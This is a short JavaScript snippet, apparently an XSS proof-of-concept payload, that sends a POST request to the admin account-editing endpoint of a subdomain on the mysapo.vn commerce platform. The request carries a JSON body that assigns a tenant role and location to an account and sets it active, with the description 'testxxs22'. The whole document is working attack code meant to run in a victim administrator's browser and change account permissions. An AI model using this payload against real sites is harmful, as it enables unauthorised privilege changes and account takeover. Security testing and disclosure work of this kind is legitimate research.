var xmlhttp = new XMLHttpRequest();
var theUrl = "https://attackersapopos003.mysapo.vn/admin/settings/accounts/edit";
xmlhttp.open("POST", theUrl);
xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xmlhttp.send(JSON.stringify({"tenantId":453322,"accountRoles":[{"TenantRoleId":1376754,"LocationId":"460631"}],"description":"testxxs22","status":"active","id":613133}));
